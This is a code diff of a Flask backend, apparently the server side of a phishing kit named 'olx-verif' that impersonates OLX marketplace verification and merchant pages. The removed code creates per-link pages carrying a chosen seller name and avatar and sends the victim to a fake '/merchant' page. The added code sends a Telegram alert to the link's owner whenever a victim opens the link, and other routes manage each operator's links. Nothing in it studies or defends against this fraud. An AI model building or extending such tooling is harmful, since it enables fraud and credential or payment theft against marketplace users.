@@ -1,68 +1,48 @@
-from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory
 import os
 import shutil
-from bs4 import BeautifulSoup
 import json
+import requests
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-@app.route('/verif/<random_id>', methods=['POST'])
-def save_page(random_id):
-    seller_name_tag = request.form.get('seller_name_tag')
-    avatar_url = request.form.get('avatar_url')
-    current_domain = request.form.get('current_domain')
+# Настройки Telegram
+API_TOKEN = 'YOUR_TELEGRAM_BOT_API_TOKEN'
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
 
-    if not seller_name_tag or not avatar_url or not current_domain:
-        return jsonify({'error': 'Missing data'}), 400
+# Путь к файлу со ссылками
+LINKS_FILE = '/home/user/app/data/links.json'
 
-    # Define paths
-    page_save_path = f"/var/www/olx-verif/verif/{random_id}/index.html"
-    verif_source_dir = '/home/user/services/olx-verif/verif/'
-    merchant_source_dir = '/home/user/services/olx-verif/merchant/'
-    verif_source_file = os.path.join(verif_source_dir, 'index.html')
-    merchant_source_file = os.path.join(merchant_source_dir, 'index.html')
-    verif_destination_file = os.path.join('/var/www/olx-verif/verif', random_id, 'index.html')
-    merchant_destination_file = os.path.join('/var/www/olx-verif/merchant', random_id, 'index.html')
+def send_telegram_message(chat_id, text):
+    data = {
+        'chat_id': chat_id,
+        'text': text
+    }
+    response = requests.post(TELEGRAM_API_URL, data=data)
+    return response.json()
 
-    # Create directories and copy files
-    os.makedirs(os.path.dirname(page_save_path), exist_ok=True)
-    if os.path.exists(verif_source_file):
-        shutil.copy(verif_source_file, verif_destination_file)
-    else:
-        return jsonify({'error': 'File /home/user/services/olx-verif/verif/index.html not found'}), 404
+def load_links():
+    if os.path.exists(LINKS_FILE):
+        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
+            return json.load(file)
+    return []
 
-    if os.path.exists(merchant_source_file):
-        os.makedirs(os.path.dirname(merchant_destination_file), exist_ok=True)
-        shutil.copy(merchant_source_file, merchant_destination_file)
-    else:
-        return jsonify({'error': 'File /home/user/services/olx-verif/merchant/index.html not found'}), 404
+def get_user_id_by_random_id(random_id):
+    links = load_links()
+    for link in links:
+        if link['link_id'] == random_id:
+            return link['user_id']
+    return None
 
-    # Replace the content in the file
-    with open(verif_destination_file, 'r') as file:
-        content = file.read()
+@app.route('/verif/<random_id>', methods=['GET'])
+def handle_verif_link(random_id):
+    user_id = get_user_id_by_random_id(random_id)
+    if user_id:
+        send_telegram_message(user_id, f"Переход по ссылке! link_id: {random_id}")
 
-    soup = BeautifulSoup(content, 'html.parser')
-    shop_info_div = soup.find('div', class_='shop-info')
-
-    if shop_info_div:
-        img_tag = shop_info_div.find('img')
-        if img_tag:
-            img_tag['src'] = avatar_url
-
-        h3_tag = shop_info_div.find('h3')
-        if h3_tag:
-            h3_tag.contents[0].replace_with(seller_name_tag)
-
-        button_container = soup.find('div', class_='button-container')
-        if button_container:
-            button = button_container.find('button')
-            if button:
-                button['onclick'] = f"window.location.href='/merchant/{random_id}'"
-
-    with open(verif_destination_file, 'w') as file:
-        file.write(str(soup))
-
-    return jsonify({'message': 'Page saved and files copied successfully'}), 200
+    # Отображение страницы с уведомлением об успешном переходе
+    return jsonify({'message': 'Link accessed successfully'}), 200
 
 @app.route('/merchant/<random_id>')
 def serve_merchant_page(random_id):
@@ -70,11 +50,9 @@ def serve_merchant_page(random_id):
     return send_from_directory(merchant_path, 'index.html')
 
 @app.route('/load_links', methods=['GET'])
-def load_links():
-    links_file = '/home/user/app/data/links.json'
-
-    if os.path.exists(links_file):
-        with open(links_file, 'r', encoding='utf-8') as file:
+def load_links_route():
+    if os.path.exists(LINKS_FILE):
+        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
@@ -87,7 +65,7 @@ def save_link():
     if not link_data:
         return jsonify({'error': 'No data provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
     links_dir = os.path.dirname(links_file)
 
     # Создаем директорию, если она не существует
@@ -121,7 +99,7 @@ def delete_ad():
     if not ad_id:
         return jsonify({'error': 'No ad_id provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
     verif_path = f'/var/www/olx-verif/verif/{ad_id}'
     merchant_path = f'/var/www/olx-verif/merchant/{ad_id}'
 
@@ -155,7 +133,7 @@ def delete_all_ads():
     if not user_id:
         return jsonify({'error': 'No user_id provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
 
     # Загружаем существующие данные
     if os.path.exists(links_file):
